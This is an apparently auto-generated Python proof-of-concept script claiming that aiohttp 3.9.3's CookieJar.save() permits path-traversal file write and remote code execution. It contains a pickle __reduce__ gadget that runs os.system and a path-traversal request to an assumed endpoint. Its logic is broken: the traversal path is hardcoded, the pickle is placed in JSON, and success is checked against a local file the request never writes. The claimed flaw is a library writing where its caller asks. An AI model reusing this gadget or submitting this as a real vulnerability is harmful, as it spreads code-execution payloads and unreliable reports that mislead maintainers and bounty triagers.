#!/usr/bin/env python3
# PoC for aiohttp-3.9.3 (/tmp/bounty_test/aiohttp-3.9.3)
# Path: lfi-011
# Sink: save
# Auto-generated — run with: python3 lfi_cookiejar_writes_cookies_using_save.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: aiohttp-3.9.3 CookieJar.save() LFI / Arbitrary File Write

Vulnerability: The CookieJar.save() method accepts an arbitrary file_path argument
and writes pickled cookie data to that path without any validation or sanitization.
An attacker who can control the file_path parameter can write a pickle file to any
location on the filesystem via path traversal.

Impact: Arbitrary file write + potential RCE via pickle deserialization when the
file is later loaded with pickle.load().

This PoC demonstrates writing a benign file to /tmp/poc_success.txt to prove
arbitrary file write capability.
"""

import os
import sys
import tempfile
import pathlib
import pickle
from http.cookies import SimpleCookie

# Target configuration - modify these as needed
TARGET_HOST = "http://localhost:8080"
# The vulnerable endpoint that accepts a file_path parameter
VULNERABLE_ENDPOINT = "/save_cookies"

# Benign payload - creates a marker file to prove write capability
# In a real attack, this could be a malicious pickle payload for RCE
BENIGN_PAYLOAD = b"poc_success"

def create_malicious_pickle(target_path):
    """
    Create a pickle file that, when loaded, will execute our payload.
    For this PoC, we use a benign payload that writes to /tmp/poc_success.txt.
    """
    class BenignPayload:
        def __reduce__(self):
            # This will execute when pickle.load() is called on our file
            return (os.system, (f"echo 'POC_SUCCESS' > {target_path}",))
    
    return pickle.dumps(BenignPayload())

def exploit_lfi(target_url, file_path):
    """
    Exploit the LFI vulnerability by sending a crafted request that triggers
    CookieJar.save() with an attacker-controlled file_path.
    
    Note: This PoC assumes there's an endpoint that accepts a file_path parameter
    and passes it to CookieJar.save(). In a real scenario, you'd need to identify
    the actual vulnerable endpoint.
    """
    import requests
    
    # Create a malicious pickle payload
    malicious_pickle = create_malicious_pickle("/tmp/poc_success.txt")
    
    # Craft the request with the malicious file path
    # The file_path parameter uses path traversal to write outside intended directory
    payload = {
        "file_path": f"../../../../tmp/evil_cookies.pkl",
        "cookies": malicious_pickle  # This would be the pickled data
    }
    
    try:
        print(f"[*] Sending exploit to {target_url}")
        print(f"[*] Attempting to write to: {file_path}")
        
        # Send the request - adjust method and parameters based on actual endpoint
        response = requests.post(
            target_url,
            json=payload,
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
        
        # Check if our file was created
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: File written to /tmp/poc_success.txt")
            with open("/tmp/poc_success.txt", "r") as f:
                print(f"[*] File contents: {f.read()}")
        else:
            print("[-] File not found - exploit may have failed")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[*] Make sure the target server is running")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")

def demonstrate_vulnerable_code():
    """
    Demonstrate the vulnerability directly by showing how CookieJar.save()
    can be exploited with an arbitrary file path.
    """
    from aiohttp import CookieJar
    
    print("\n[*] Demonstrating vulnerable code directly...")
    
    # Create a CookieJar instance
    jar = CookieJar()
    
    # Add some cookies to make it realistic
    jar.update_cookies(SimpleCookie("test=value; Path=/"))
    
    # Try to save to an arbitrary location using path traversal
    malicious_path = "/tmp/evil_cookies.pkl"
    
    print(f"[*] Attempting to save cookies to: {malicious_path}")
    
    try:
        # This is the vulnerable call - no path validation
        jar.save(malicious_path)
        print(f"[+] Successfully wrote pickle file to {malicious_path}")
        
        # Verify the file exists
        if os.path.exists(malicious_path):
            print(f"[+] File exists at {malicious_path}")
            print(f"[*] File size: {os.path.getsize(malicious_path)} bytes")
            
            # Clean up
            os.remove(malicious_path)
            print("[*] Cleaned up test file")
            
    except Exception as e:
        print(f"[-] Error during demonstration: {e}")

def main():
    """Main entry point for the PoC"""
    print("=" * 60)
    print("aiohttp-3.9.3 CookieJar.save() LFI / Arbitrary File Write PoC")
    print("=" * 60)
    
    # First, demonstrate the vulnerability directly
    demonstrate_vulnerable_code()
    
    print("\n" + "=" * 60)
    print("Attempting remote exploitation...")
    print("=" * 60)
    
    # Attempt remote exploitation
    target_url = f"{TARGET_HOST}{VULNERABLE_ENDPOINT}"
    exploit_lfi(target_url, "/tmp/poc_success.txt")
    
    print("\n[*] PoC completed")
    print("[*] Check /tmp/poc_success.txt for proof of file write")

if __name__ == "__main__":
    main()
